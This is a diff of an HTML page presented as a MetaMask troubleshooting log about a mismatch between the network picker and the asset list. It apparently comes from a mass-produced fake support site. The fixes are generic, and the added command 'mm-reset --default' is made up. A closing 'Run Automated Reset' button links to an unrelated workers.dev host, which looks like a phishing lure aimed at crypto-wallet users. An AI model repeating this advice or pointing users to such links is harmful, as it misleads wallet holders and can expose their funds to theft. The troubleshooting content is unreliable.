@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #0a0c10;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -42,34 +42,32 @@
 <h1>Metamask Extension Bug Assets Miss Match Between Network Picker</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The Metamask extension displays a mismatch between the selected network in the network picker and the assets shown in the modal, which is supposed to show "All popular" assets but instead shows assets from a different network.</li>
+<li>Users experience a mismatch between the assets displayed in the network picker and the modal window, showing "All popular" assets, when using the Metamask extension on the Ethereum (ETH) ecosystem.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension that causes the network picker and the asset modal to become desynchronized, resulting in the display of incorrect assets.</li>
+<li>The error occurs due to a bug in the Metamask extension, where the network picker and modal window are not properly synchronized, resulting in a discrepancy between the displayed assets.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To resolve the issue, try the following manual overrides:</li>
 <li>Update the Metamask extension to the latest version</li>
-<li>Reset the Metamask extension settings to default</li>
-<li>Use the following JSON configuration to manually override the network settings:</li>
+<li>Reset the Metamask settings to default using the following command:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mainnet&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;assets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;ETH&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;DAI&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USDC&quot;</span><span class="p">]</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>mm-reset<span class="w"> </span>--default
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration. </p>
+<ul>
+<li>Manually configure the network settings using a JSON configuration file</li>
+</ul>
+<p>Consider using an external console for further debugging and customization. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and enabled</li>
-<li>Ethereum network selected in the network picker</li>
-<li>Assets modal open and displaying incorrect assets</li>
+<li>Metamask extension installed and configured</li>
+<li>Ethereum (ETH) ecosystem selected as the primary network</li>
+<li>Basic understanding of JSON configuration files and command-line interfaces</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
